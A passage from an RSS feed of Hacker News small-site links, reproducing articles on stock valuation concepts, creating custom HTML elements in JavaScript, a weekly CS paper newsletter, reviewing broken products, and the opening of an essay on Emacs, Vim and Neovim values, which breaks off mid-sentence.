<br/>
January 17, 2021 | https://www.lucacap.com/post/methods-of-valuation | <a href="https://web.archive.org/web/*/https://www.lucacap.com/post/methods-of-valuation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-hook="post-description"><article><div><div data-rce-version="8.13.3"><div dir="ltr"><div><p id="viewer-foo"><span><strong>Important Concepts  </strong></span></p><p id="viewer-7otj2"><span>I. Price and Value </span></p><p id="viewer-a0sbk"><span>II. Margin of Safety </span></p><p id="viewer-8vhs8"><span>III. Dislocation of Value </span></p><p id="viewer-609b6"><span>IV. Drivers of Value Creation </span></p><p id="viewer-5ml51"><span><strong>Methods of Valuation  </strong></span></p><p id="viewer-41evk"><span>I. Discounted Cash Flows </span></p><p id="viewer-2mdf0"><span>II. Future Market Cap/Exit Price </span></p><p id="viewer-4alkq"><span>III. Probabilistic Valuation </span></p><p id="viewer-6v6es"><span>IV. Relative Valuation</span></p><h2 id="viewer-4pn5i"><span><strong>INTRODUCTION</strong>

</span></h2><p id="viewer-2eg5s"><span>Estimating value is essential to assess the potential returns of an investment, the probability of those returns, and the risks involved.

The best risk-management occurs at the individual stock level; therefore, developing strong qualitative and quantitative analytical skills, and understanding the shortcomings of each method of valuation, is crucial to long-term investment success.

We learn different methods of valuation in business school or from reading popular textbooks such as <em>Valuation: Measuring and Managing the Value of Companies </em>by McKinsey. These quantitative foundations give us the formulas and theory behind valuation methods; however, performing practical valuation with money on the line is quite different. Estimating value in practice is about forecasting—and estimating is what you do when you do not know.

Businesses have been bought and sold for centuries and there must have been methods to come up with a fair and mutually agreed upon price of the transactions in the distant past. Perhaps it was a multiple of free cash flow from the business or the value of the assets, plus a discount or premium.

Methods of valuation have evolved since the distant past, particularly in the 20th century. Legendary economists Irving Fisher developed the idea of internal rate of return (IRR) in his books <em>The Rate of Interest </em>(1907) and <em>The Theory of Interest </em>(1930). John Burr Williams then wrote <em>The Theory of Investment Value </em>(1938), in which he introduced the idea of companies having an “intrinsic value” and using a mathematical formula to calculate this, which he called the “present value of future cash flows”.

Discounted Cash Flows is undoubtedly the correct way to calculate the true worth of an asset, bond, or business. However, as we will discuss, it has limitations when applied to valuing businesses. In fact, all methods of valuation have their limitations and it is important to understand those limitations or we run the risk of being victims of “false precision”.

A common rule for valuation is that it is better to be approximately right than precisely wrong. In other words, valuation requires a range of calculations based on future variables that are impossible to predict with certainty. Valuation can be described as iffy: “if so-and-so happens, then the cash flows should be so-and so, then the company is worth this much.”

Shortcuts to valuation have evolved over time as well. Traditional measures such as the Price-to-Book ratio, Dividend Yield, and Price-to-Earnings ratio are now just a few of the dozens of metrics analyzed: Enterprise Value-to-EBITDA ratio, Free Cash Flow Yield, Price-to-Sales ratio, PEG Ratio, Replacement Value, Adjusted Earnings, Return on Invested Capital, and so on.

Before we get into the methods of valuation, we must first understand four critical concepts: price versus value, margin of safety, dislocations of value, and drivers of value creation.</span></p><h2 id="viewer-4cuvm"><span>
<strong>PART</strong> <strong>I: IMPORTANT</strong> <strong>CONCEPTS</strong>

</span></h2><p id="viewer-43lga"><span><strong>Critical</strong> <strong>Concept #1:</strong> <strong>Price and</strong> <strong>Value</strong>

</span></p><p id="viewer-29mp8"><span><em>“Long ago, Ben Graham taught me that ‘Price is what you pay, value is what you get.’”</em>

–Warren Buffett, 2008 Berkshire Hathaway Shareholders’ Letter</span></p><p id="viewer-9kiu7"><span>
There are three important concepts when it comes to “value”: value of a bet, returns, and intrinsic value.

Investing is putting up money today with the expectation of getting the money back in the future, plus a profit. When it comes to investing in businesses, the outcomes are not guaranteed, which is a way of saying that investors are placing bets. Every investment into a business is speculative, but there are varying degrees of speculation. One way to reduce the speculative nature of bets on businesses is through careful analysis of the value of the bet and being highly selective, only betting when (1) the odds of losing money are low, (2) the losses are low if you lose money, and (3) the odds of making attractive returns are high.

The Internal Rate of Return (IRR) on a bet incorporates all cash flow distributions to an investor and provides an annualized return on the investment. Investors forecast IRRs of investments to assess whether to participate in the investment. IRR, however, does not tell us the probability of that return or the level of risk for the investment. Claiming that an investment generated a high IRR, therefore it was “undervalued”, is not sensible reasoning. For example, if you double your money on an investment (i.e. bet) very quickly, you can argue that you are gifted and the bet was undervalued at the time of placing the bet. However, you may be wrong. If I offer you double or nothing on a coin flip for $1,000, the value of the bet is not $2,000 just because you won. And the value of the bet was not $0
if you lost the bet. Based on probabilities and expected returns, the value of the bet was $1,000 whether you won or lost. The outcome of a bet does not determine the riskiness or value of the bet.</span></p><p id="viewer-357p7"><span>Intrinsic value of an asset can be defined as the “true worth” of an asset, typically expressed as the net present value of all future cash flows. While the discount rate or opportunity cost varies among investors, the cash flows on bonds are very precise and predictable, making them easier to value.

The bond markets also provide a clear example of the difference between price and intrinsic value. Imagine you buy a zero-coupon bond in a high-quality company with a maturity in three years. After the purchase, the cash flows will be delivered as scheduled, but the price will fluctuate up and down as buyers and sellers trade in and out. One may argue that the discount rate or opportunity cost changes over time and that accounts for the price fluctuations, but investors’ opportunity cost are different; the value to you has not changed, only the price.

Defining intrinsic value gets complicated for assets that do not produce cash flows. Consider a painting, for example. A painting does not generate periodic cash flows, it is only worth as much as the highest bid at the time of a sale. In other words, value equals the highest price someone is willing to pay at any given moment. A building or house, by contrast, does have different methods of valuation: replacement value, land value, and a possible cash flow value if it is rented out.

Investors need to be aware of the false precision of formulas used to value businesses. Businesses do not have a precise value, nor do they have a fixed value over time. The prices of businesses, especially publicly traded companies in the stock market, fluctuate as well. However, just because both value and price fluctuate, does not mean that they are equal. In fact, it means that companies are almost always mispriced relative to their value.

A recent illustration of the disconnect between price and value in businesses was in March of 2020, when the S&amp;P 500 fell roughly 35% from its February high, but then finished the year up over 18%. The future earning power and intrinsic value of the 500 companies in the S&amp;P 500 did not fluctuate nearly that much in 2020. High volatility creates big dislocations of value.

The most unbiased way to value a company is to begin without looking at its current price and past prices. However, nearly all investors, including those that say they are “fundamental investors” and do not perform technical analysis, use the current price and past prices as an anchor. If you are looking at prices, you must understand the biases it creates. A stock that has gone down a lot from its high is not necessarily undervalued and a stock that has gone up a lot recently is not necessarily overvalued.

It is remarkable how many people come up with valuations almost entirely based on prices, including Wall Street analysts. If a stock goes up a lot, they raise the price target. If the stock goes down, they lower the price target. During market corrections and rebounds this can be especially amusing as their price targets fly around in reaction to the sharp stock price swings. If an analyst had a price target on a stock of $50 and the stock doubled to $100, he or she would likely raise the target to $110 or $120 to reflect his or her continued confidence in the company. If the stock was $100 and fell to $50, he or she might lower the price target to $60 or $70 to reflect continued confidence. It is important to keep in mind that analysts
12-month target prices are not calculations of intrinsic value, they are potential future prices and should be ignored entirely.</span></p><p id="viewer-6dd1a"><span>
<strong>Critical</strong> <strong>Concept</strong> <strong>#2: Margin</strong> <strong>of</strong> <strong>Safety</strong>

Margin of safety is one of the most important concepts in investing and is a term coined by Benjamin Graham in the 1949 first edition of <em>The Intelligent Investor</em>. He devoted an entire chapter to the concept and wrote:</span></p><p id="viewer-5u6ja"><span>
<em>“In the old legend the wise men finally boiled down the history of mortal affairs into the single phrase, “This too will pass.” Confronted with a like challenge to distill the secret of sound investment into three words, we venture the motto, MARGIN OF SAFETY. This is the thread that runs through all the preceding discussion of investment policy—often explicitly, sometimes in a less direct fashion.”</em></span></p><p id="viewer-ec2f0"><span>In other words, valuation is not precise, and the future cash flows are not perfectly predictable. What matters when doing valuation is not that you come up with the correct calculation of intrinsic value (you cannot), but that there is a sufficient margin of safety relative to the price you pay. This is another way of saying you should seek payoffs that are low risk and high reward.

Value investors scoff at the idea of growth investors claiming that they look for a margin of safety in their investments. However, Ben Graham said himself that he believed this was possible but challenging. He wrote in <em>The …</em></span></p></div></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lucacap.com/post/methods-of-valuation">https://www.lucacap.com/post/methods-of-valuation</a></em></p>]]>
            </description>
            <link>https://www.lucacap.com/post/methods-of-valuation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811156</guid>
            <pubDate>Sun, 17 Jan 2021 15:00:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Create your own HTML element]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25811039">thread link</a>) | @josiasaurel
<br/>
January 17, 2021 | https://josiasdev.best/create-your-own-html-element | <a href="https://web.archive.org/web/*/https://josiasdev.best/create-your-own-html-element">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><div><div><div><div><p>Subscribe to <!-- -->my<!-- --> newsletter and never miss <!-- -->my<!-- --> upcoming articles</p></div></div></div><div itemprop="text"><p>Have you ever thought about creating your own HTMl element ? If you have ever used a frontend framework like React or Vue or even Angular, you might have been amazed by the fact that you could create literally any component and have reused it throughout your app. What will typically happen with your elements is that they get compiled down into some javascript which takes care of the DOM.
But what about actually creating an HTML element ? That is what we are going to learn in this post.</p>
<p>At the end of this tutorialy you will be able to create your own basic HTML element.
To get started, create a new folder to contain the code from this tutorial.
Open that folder and create three files named <em>index.html, style.css and main.js</em>.</p>
<p>We are going to start with the usual HTML boilerplate like below :</p>
<pre><code><span>&lt;!DOCTYPE <span>html</span>&gt;</span>
<span>&lt;<span>html</span> <span>lang</span>=<span>"en"</span>&gt;</span>
<span>&lt;<span>head</span>&gt;</span>
    <span>&lt;<span>meta</span> <span>charset</span>=<span>"UTF-8"</span>&gt;</span>
    <span>&lt;<span>meta</span> <span>name</span>=<span>"viewport"</span> <span>content</span>=<span>"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span>&lt;<span>link</span> <span>rel</span>=<span>"stylesheet"</span> <span>href</span>=<span>"style.css"</span>&gt;</span>
    <span>&lt;<span>title</span>&gt;</span>Custom Element<span>&lt;/<span>title</span>&gt;</span>
<span>&lt;/<span>head</span>&gt;</span>
<span>&lt;<span>body</span>&gt;</span>
    <span>&lt;<span>script</span> <span>src</span>=<span>"main.js"</span>&gt;</span><span>&lt;/<span>script</span>&gt;</span>
<span>&lt;/<span>body</span>&gt;</span>
<span>&lt;/<span>html</span>&gt;</span>
</code></pre>
<p>Now that we have our basic html code, let us get a name for our element. I will name it <em>hello-world</em>, a pretty simple name ;). Now add your element into your HTML code, between the body tags above the script tag. You can add any text between your element tags. Your final HTML should look as such.</p>
<pre><code><span>&lt;!DOCTYPE <span>html</span>&gt;</span>
<span>&lt;<span>html</span> <span>lang</span>=<span>"en"</span>&gt;</span>
<span>&lt;<span>head</span>&gt;</span>
    <span>&lt;<span>meta</span> <span>charset</span>=<span>"UTF-8"</span>&gt;</span>
    <span>&lt;<span>meta</span> <span>name</span>=<span>"viewport"</span> <span>content</span>=<span>"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span>&lt;<span>link</span> <span>rel</span>=<span>"stylesheet"</span> <span>href</span>=<span>"style.css"</span>&gt;</span>
    <span>&lt;<span>title</span>&gt;</span>Custom Element<span>&lt;/<span>title</span>&gt;</span>
<span>&lt;/<span>head</span>&gt;</span>
<span>&lt;<span>body</span>&gt;</span>
    <span>&lt;<span>hello-world</span> <span>id</span>=<span>"hello"</span> <span>ishidden</span>&gt;</span>
        Hello World
    <span>&lt;/<span>hello-world</span>&gt;</span>
    <span>&lt;<span>script</span> <span>src</span>=<span>"main.js"</span>&gt;</span><span>&lt;/<span>script</span>&gt;</span>
<span>&lt;/<span>body</span>&gt;</span>
<span>&lt;/<span>html</span>&gt;</span>
</code></pre>
<p>We are done with the HTMl code. Time to write some javascript. 
Create a class named <code>HelloWorld</code> which extends <em>HTMLElement</em>.</p>
<pre><code>

<span><span>class</span> <span>HelloWorld</span> <span>extends</span> <span>HTMLElement</span> </span>{

}
</code></pre>
<p>Now we need to <em>define</em> our element. This is to make the browser aware that we are creating a new element that we are going to reuse.
After the class, add the following line of code.</p>
<pre><code>customElements.define(<span>"hello-world"</span>, HelloWorld)
</code></pre>
<p>What is this ?
The browser exposes a function called <code>customElements.define</code> which permits to define a new element that can be reused. It takes two arguments; the first being the element name (which should be the exact same as the one used in the HTML code) and a second argument which is the class of the element.</p>
<p>We create a class in order to have a custom element with our own properties and attributes. This permits us to as well add our own event listeners, functions and behaviours.</p>
<p>Now you have created your own custom html element.
It is good practice to add a <code>constructor</code> to your element class. You will also have to add a <code>super()</code> function in order to make sure you are inheriting all HTMlElement methods, attributes and properties.</p>
<p>Adding so, you will have a class looking as such.</p>
<pre><code>

<span><span>class</span> <span>HelloWorld</span> <span>extends</span> <span>HTMLElement</span> </span>{
    <span>constructor</span>() {
        <span>super</span>()
    }
}
</code></pre>
<p>You can also define custom methods like below.</p>
<pre><code>

<span><span>class</span> <span>HelloWorld</span> <span>extends</span> <span>HTMLElement</span> </span>{
    <span>constructor</span>() {
        <span>super</span>()
    }

    getId() {
        <span>return</span> <span>this</span>.id
    }
}
</code></pre>
<p>Above, we created a method on the element named <code>getId()</code> which will return the id of the element. </p>
<p>You can select your custom element from javascript just like you will do with any other element using <em>document.querySelector()</em> <em>document.querySelectorAll()</em> <em>document.getElementById()</em> etc. You can try adding an id attribute and selecting the element using a method of your choice and calling the <code>getId()</code> method on it.</p>
<p>Okay, we have created our own element using just html and javascript. Buy how can i access lifecycle hooks just like in React or Vue.
Using you defined class, you can as well have access to lifecycle methods, allowing you to execute some peice of code when for example, the component is connected to the DOM.
Below is an example. </p>
<pre><code>connectedCallback() {
        <span>if</span> (<span>this</span>.hasAttribute(<span>"ishidden"</span>)) {
            <span>this</span>.style.backgroundColor = <span>"grey"</span>
            <span>this</span>.style.pointerEvents = <span>"none"</span>
        }
    }
</code></pre>
<p>This method <em>connectedCallback</em> will be executed when the element will be connected to the DOM, in other words, <em>mounted</em>. In the example, we are checking if the element has the <code>ishidden</code> attribute and we then change the background color and pointer event.
Your final javascript should look as below now.</p>
<pre><code>

<span><span>class</span> <span>HelloWorld</span> <span>extends</span> <span>HTMLElement</span> </span>{

    <span>constructor</span>() {
        <span>super</span>()
    }
    connectedCallback() {
        <span>if</span> (<span>this</span>.hasAttribute(<span>"ishidden"</span>)) {
            <span>this</span>.style.backgroundColor = <span>"grey"</span>
            <span>this</span>.style.pointerEvents = <span>"none"</span>
        }
    }

    getId() {
        <span>return</span> <span>this</span>.id
    }

}

customElements.define(<span>"hello-world"</span>, HelloWorld)
</code></pre>
<p>Now we have a basic element working. </p>
<blockquote>
<p>It is good to note that <code>connectedCallback()</code> is not the only hook. We also have the <code>disconnectedCallback()</code> and <code>attributeChangedCallback()</code></p>
</blockquote>
<p>What about styling ?
You can directly access the element using its name in CSS. In my CSS file, i added some basic styling to make it look a little good.</p>
<pre><code><span>hello-world</span> {
    <span>background-color</span>: red;
    <span>padding</span>: <span>1em</span>;
    <span>border-radius</span>: <span>5px</span>;
    <span>position</span>: relative;
    <span>top</span>: <span>4em</span>;
}
</code></pre>
<p>You have reached the end of this post. I hope you enjoyed it. If you did, make sure to give me a follow on twitter. I usually tweet about tech and experimentations i do as well as tips/advices.</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://josiasdev.best/create-your-own-html-element</link>
            <guid isPermaLink="false">hacker-news-small-sites-25811039</guid>
            <pubDate>Sun, 17 Jan 2021 14:49:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Continously learn about computer science, one paper at a time]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25810830">thread link</a>) | @l1am0
<br/>
January 17, 2021 | https://simon.red/wcp | <a href="https://web.archive.org/web/*/https://simon.red/wcp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<h2>Get a computer science paper every Weekend</h2>
<p><img src="https://simon.red/img/spongebob_reading.webp">
</p>
<p>
Throughout my university career I got introduced to research papers and found that they are <b>a lot easier to
understand than I always feared</b>. After reading a few I fell in love with this resource as they provide
me insights into the <b>spearhead of knowledge</b> in my field. And to be honest, even though I enjoy reading
blog posts, the quality of a peer-reviewed research paper is just on a complete different level.
</p>
<p>
With the <i>Weekly CS Paper</i> newsletter I want to introduce you to the joy of continuous learning about the
current findings in CS. <b>Every Weekend</b> you will receive a <b>handpicked computer science research paper</b> for
reading over the weekend.
</p>
<p>
As I mostly dive into topics regarding <b>distributed systems and backend development</b> the focus will
definitely be in that area.
</p>

<p> If you want to first <b>checkout what you are getting yourself into</b>, all the previous issues of the newsletter are in the <a href="https://simon-frey.com/weeklycspaper/archive/">Archive</a></p>
<p>In addition to the newsletter there is a <b>Telegram group</b> in which you can <b>discuss the papers</b> with other newsletter subscribers 🤓
</p>
<hr>
<h2>FAQs</h2>
<h3>When does the first newsletter arrive?</h3>
Whenever you subscribe the next Weekend. If you are subscribing on a Weekend and the newsletter was already send out you might have to wait a week. I still could not figure out how to automatically resend the last issue to new subscribers. (Maybe I will find a paper on that topic at some point 😅)
<h3>What are the papers you did send out so far?</h3>
You can find all past issues of the newsletter in the <a href="https://simon-frey.com/blog/category/weeklycspaper/">Archive</a>.
<h3>How do I get into the Telegram group?</h3>
In every weekly newsletter the Telegram group is linked. You can join the moment you receive your first newsletter on Weekend.
<h3>For free and no ads, why are you doing this newsletter?</h3>
I created this newsletter as I enjoy reading scientific papers and want to give that joy to others. And to be 100% honest, the newsletter is not that much time effort for me as of why I do not need to monetize it.
<br>
Maybe at some point you need a consultant helping with optimizing your backend architecture and services. Would be awesome if you <a href="https://simon-frey.com/">think of me</a> at that point 🤓 This is what I considrer win-win.
<h3>Is this all legal?</h3>
Research papers sometimes have problems with paywalls and are limited access. I only select so-called <a href="https://en.wikipedia.org/wiki/Open_access">open access</a> papers that are free to read for anyone. None of the papers are hosted on my server.
<hr>
<p>
Learn more about what I am currently up to on <a href="https://simon-frey.com/">simon-frey.com</a>, follow me on
<a href="https://twitter.com/eu_frey">Twitter</a> or checkout the cool stuff I find all around the web on my <a href="https://simon-frey.com/links/">Open Link List</a>
</p>


</div>]]>
            </description>
            <link>https://simon.red/wcp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810830</guid>
            <pubDate>Sun, 17 Jan 2021 14:24:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Review broken products instead of new ones]]>
            </title>
            <description>
<![CDATA[
Score 187 | Comments 90 (<a href="https://news.ycombinator.com/item?id=25810708">thread link</a>) | @hubraumhugo
<br/>
January 17, 2021 | https://www.buyforlife.com/blog/6CNqJGMKraaQhfivS0EH6L/why-we-should-review-broken-products-instead-of-new-ones | <a href="https://web.archive.org/web/*/https://www.buyforlife.com/blog/6CNqJGMKraaQhfivS0EH6L/why-we-should-review-broken-products-instead-of-new-ones">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app"><div data-v-1e6f7098=""><div data-v-1e6f7098=""><div data-v-1e6f7098=""><div data-v-1e6f7098=""><p data-v-1e6f7098=""><strong data-v-1e6f7098="">For most people, the majority of positive reviews are noise on any product and they evaluate them by reading negative reviews.</strong></p><p data-v-1e6f7098="">For once, let's turn it all upside down:</p><p data-v-1e6f7098="">We should build a collection about how things break - review broken and worn-out products to teach how to identify cheap products (where are the stress points, what manufacturing techniques exist to alleviate those). Then compare those with used products well past their warranty period that&nbsp;hasn't&nbsp;broken, and look at why they haven't.</p><p data-v-1e6f7098="">Repairability also comes to mind. Everything breaks eventually because we can't cheat entropy, but when it does, can you easily repair it?</p><p data-v-1e6f7098="">Use<a data-v-1e6f7098="" href="https://www.buyforlife.com/product-submission"> our submission form</a>&nbsp;for all your broken or thrown away products. If you select "Broken" as a condition, questions about the repairability and where the stress points were will show up.</p><p><img data-v-1e6f7098="" src="https://images.ctfassets.net/ma604jmaffkl/6mzc5DExU1fnSHCxxX40ln/0460f057d136bb07369b3c64f06887ae/broken-review.png"></p><p data-v-1e6f7098="">Even if things don’t break - waiting a minimum of 6+ months or 50—100 minimum uses really makes a review relevant. That's why I recently introduced&nbsp;<a data-v-1e6f7098="" href="https://www.buyforlife.com/blog/4kpaLtbnG6MkseMj44niVV/recurring-reviews-to-track-the-whole-lifecycle-of-a-product">recurring reviews</a>&nbsp;to track the whole lifecycle of a product. After every year, the reviewer will receive an automatic reminder to assess the condition of the product, and if the reviewer is still happy with it.
</p><p data-v-1e6f7098="">Let me know what you think! </p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.buyforlife.com/blog/6CNqJGMKraaQhfivS0EH6L/why-we-should-review-broken-products-instead-of-new-ones</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810708</guid>
            <pubDate>Sun, 17 Jan 2021 14:04:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The values of Emacs, the Neovim revolution, and the VSCode gorilla]]>
            </title>
            <description>
<![CDATA[
Score 397 | Comments 319 (<a href="https://news.ycombinator.com/item?id=25810427">thread link</a>) | @mpereira
<br/>
January 17, 2021 | https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/ | <a href="https://web.archive.org/web/*/https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In 2018 Bryan Cantrill gave a brilliant talk where he shared his recent
experiences with the Rust programming language. More profoundly, he
explored a facet of software that is oftentimes overlooked: the <em>values</em> of
the software we use. To paraphrase him slightly:</p><blockquote><p><em>Values</em> are defined as <em>expressions of relative importance</em>. Two things that
we’re comparing could both be good attributes. The real question is, when
you have to make a choice between two of them, what do you choose? That
choice that you make, reflects your core values.</p></blockquote><p>He goes ahead to contrast the core values of some programming languages with
the core values we demand from systems software, like operating system
kernels, file systems, microprocessors, and so on. It is a really good talk
and you should <a href="https://www.youtube.com/watch?v=2wZ1pCpJUIM">watch it</a>.</p><blockquote><p>It is important to think about values because they are <em>core to the
decisions that we make</em>.</p></blockquote><p>Unlike systems software, the values demanded from text editors or IDEs vary
greatly depending on who you ask. These are much more personal tools and
make room for a diverse set of desires.</p><p>The following listing enumerates values that could be attributed to
development tools.</p><table><thead><tr><th>Value</th><th>Commentary</th></tr></thead><tbody><tr><td><strong>Approachability</strong></td><td>Ease of getting started with for typical tasks, and contribution friendliness</td></tr><tr><td><strong>Doing one thing well</strong></td><td>Unix philosophy, fitting into an ecosystem</td></tr><tr><td><strong>Editing efficiency</strong></td><td>Fewer interactions, mnemonics, composable keystrokes, etc.</td></tr><tr><td><strong>Extensibility</strong></td><td>The degree to which behavior and appearance can be changed</td></tr><tr><td><strong>Freedom</strong></td><td>Embraces <a href="https://www.gnu.org/philosophy/free-sw.en.html">free</a> software, rejects proprietary software</td></tr><tr><td><strong>Integration</strong></td><td>Cohesive core and concerted third-party functionality</td></tr><tr><td><strong>Introspectability</strong></td><td>Capable of being understood and inspected ad-hoc</td></tr><tr><td><strong>Keyboard centrism</strong></td><td>Focus on keyboard interactions</td></tr><tr><td><strong>Maintainability</strong></td><td>The degree to which it can be modified without introducing faults</td></tr><tr><td><strong>Progressiveness</strong></td><td>A measure of eagerness to make progress and leverage modern technology</td></tr><tr><td><strong>Stability</strong></td><td>Things that worked before continue to work the same way</td></tr><tr><td><strong>Text centrism</strong></td><td>Text as a universal interface</td></tr><tr><td><strong>Velocity</strong></td><td>Short and focused release cycles, aligned personpower, leveraging the community effectively</td></tr></tbody></table><div><p>Before we go any further, I'd like to point that out if you care about
any of the topics discussed ahead you will likely strongly disagree
with something or the other.</p><p>That's fine! We probably just have different values.</p></div><p>In my view, Emacs has the following core values:</p><p><strong>Emacs</strong></p><ul><li>Extensibility</li><li>Freedom</li><li>Introspectability</li><li>Keyboard centrism</li><li>Stability</li><li>Text centrism</li></ul><p>We can feel the clasp of <em>stability</em> in the following—rather
poetic—exchange in the Emacs development mailing list, which also provides
useful historical perspectives.</p><blockquote><p>Emacs is older than the operating systems people use today. (It is almost
as old as the first Unix, which barely resembled the Unix of later
decades.) It is much older than Linux, the kernel.</p><p>The oldest design elements were not designed for the uses we make of them
today. And since we wrote those, people have developed other areas of
software which don’t fit Emacs very well. So there are good reasons to
redesign some of them.</p><p>However, people actually use Emacs, so a greatly incompatible change in
Emacs is as unthinkable as a greatly incompatible change in the New York
City subway.</p><p>We have to build new lines through the maze of underground pipes and
cables.</p><p>— <a href="https://lists.gnu.org/archive/html/emacs-devel/2020-09/msg00607.html">Richard Stallman in “Re: Discoverability (was: Changes for 28)” (2020)</a></p></blockquote><p>The following exchange reifies <em>freedom</em> and <em>stability</em> while demonstrating a
disinclination to <em>progressiveness</em>. Which is neither good nor bad; it’s just
what it is.</p><blockquote><p>If Emacs was to become a “modern” app tomorrow, an editor extended in Lisp
still only has appeal for a minority of programmers, much like the Lisp
language itself. Most programmers looking for easy and modern experiences
will likely stick with Atom and Sublime.</p><p>Most of the push for a “modern look” comes from the desire for Emacs to
play more nicely with proprietary platforms. Rather, the goal of Emacs is
to support platforms like GNU/Linux. Platforms that respect your freedom,
and also do not push a corporate UI/UX vision of “modernity”.</p><p>(Perhaps if we do move forward with modernization, we should think of
modernization in the context of something like GNOME rather than MacOS or
Windows. Surely Emacs could be a better citizen of GNOME.)</p><p>Given that many of the people complaining about “how Emacs looks” are not
submitting patches to fix the problem themselves, resources would be
diverted from actual functionality to “modernity”.</p><p>By the time we do major code refactoring “modernizing” Emacs on the major
proprietary platforms, what is “modern” has now once again changed, and our
resources were put towards a project with a poor return on investment.</p><p>Basically, I don’t see a “modernizing” project playing out well. We will
spend extensive time and energy on a moving target, and even if we succeed,
our Lisp-based vision still has limited appeal. Additionally, I don’t think
“modernizing” Emacs advances the cause of free software, given that there
are other more popular casual libre tools for text editing that individuals
can use.</p><p>— <a href="https://lwn.net/ml/emacs-devel/863691n4xl.wl-me%40enzu.ru/">Ahmed Khanzada in “Re: Why is emacs so square?” (2020)</a></p></blockquote><p>Core values are self-reinforcing. They attract like-minded people, who
will then defend them.</p><p>I’m an Emacs user, and reading the Emacs mailing lists serves to remind me
that my values are very different from the values held by maintainers and
core contributors. I don’t value <em>freedom</em> or <em>stability</em> nearly as strongly
and have an inner affinity for <em>progressiveness</em> and <em>velocity</em>.</p><p>One part of valuing progressiveness is constantly re-evaluating: is our
current process or technology as good as it could be? What could be
improved? How do we measure improvement? How are others solving these
problems? Were there any advances in our area that we could leverage?</p><p>* * *</p><p>Now let’s talk about Vim. I see Vim as intersecting with a few of Emacs’
values, but ultimately diverging radically with its narrow focus on
providing really efficient editing capabilities.</p><p><strong>Vim</strong></p><ul><li>Doing one thing well</li><li>Editing efficiency</li><li>Keyboard centrism</li><li>Stability</li><li>Text centrism</li></ul><p>One might notice that <em>extensibility</em> is not in the list. That’s
intentional. Vim is certainly extensible to a degree, but it just does not
compare to Emacs. Vim <em>has</em> a “plugin system”, while Emacs <em>is</em> the system.
Your code becomes part of it the moment it’s evaluated. Since I’m sticking
to <em>yes/no</em> indicators for values I’m giving it a <em>no</em>.</p><p><em>Stability</em> emanates from communications with the primary maintainer.</p><blockquote><p>Vim development is slow, it’s quite stable and still there are plenty of
bugs to fix. Adding a new feature always means new bugs, thus hardly any
new features are going to be added now. I did add a few for Vim 7.3, and
that did introduce quite a few new problems. Even though several people
said the patch worked fine.</p><p>— <a href="http://vim.1045645.n5.nabble.com/Scrolling-screen-lines-I-knew-it-s-impossible-td3358342.html#a3359206">Bram Moolenar in “Re: Scrolling screen lines, I knew, it’s impossible.”
(2011)</a></p></blockquote><p>And of course in this famous exchange in a QA session.</p><blockquote><blockquote><p>How can the community ensure that the Vim project succeeds for the
foreseeable future?</p></blockquote><p>Keep me alive.</p><p>— <a href="https://www.binpress.com/vim-creator-bram-moolenaar-interview/">Bram Moolenaar in “10 Questions with Vim’s creator” (2014)</a></p></blockquote><p>At the end of 2013, a few folks were trying to get new concurrency
primitives merged into Vim. This would empower plugin authors to create
entirely new types of functionality and by extension, make Vim better.</p><p>This is what one of them had to say about the process:</p><blockquote><p>The author of Neovim (Thiago de Arruda) tried to add support for
multi-threaded plugins to Vim and has been stymied.</p><p>I’m not sure how to get a patch merged into Vim. Bram Moolenar is the only
person with commit access, and he’s not a fan of most changes beyond bug
fixes. My co-founder and I tried to add setTimeout &amp; setInterval to
vimscript. Even six weeks of full-time effort and bending over backwards
wasn’t enough. Eventually we were just ignored.</p><p>I’ve contributed to a lot of open source projects, and the Vim community
has been the most difficult to work with. I’ve been writing C for almost
two decades, and the Vim codebase is the worst C I’ve ever seen. The
project is definitely showing its age, and I’d love for something new to
replace it.</p><p>— <a href="https://news.ycombinator.com/item?id=7279358">Geoff Greer in “Neovim (HN)” (2014)</a></p></blockquote><p>While they understood that some of their values were ultimately
incompatible with the values of the Vim maintainers—who prioritized
<em>stability</em>—they still tried to push for a change, because they treasured
the <em>idea of Vim</em>, embodied by some of its values.</p><p>It didn’t happen, so a Vim fork came to life: Neovim.</p><p>The vision was grand, and is summarized in a statement of its values:</p><blockquote><p>Neovim is a Vim-based text editor engineered for <em>extensibility</em> and
<em>usability</em>, to encourage new applications and contributions.</p><p><a href="https://neovim.io/charter/">neovim.io/charter</a></p></blockquote><p>Some of their concrete plans included</p><ul><li>improving testing, tooling, and CI to simplify maintenance, make
aggressive refactorings possible, and greatly reduce contributor friction</li><li>decoupling the core from the UI, making it possible to embed the Vim core
into browsers or IDEs (or any computer program really), also making way
for more powerful and diverse GUIs</li><li>embedding a Lua runtime and providing concurrency primitives to open the
doors for smoother, more efficient, and powerful plugins</li><li>extensive refactoring: bringing C code to modern standards (C99,
leveraging new compiler features), replacing platform-specific IO code
with libuv, removing support for legacy systems and compilers, including
automatic formatting, and fixing static analysis warnings and errors</li><li>creating a scriptable terminal emulator</li></ul><p>And they delivered it.</p><p>In a very short amount of time they were able to, and I don’t use this word
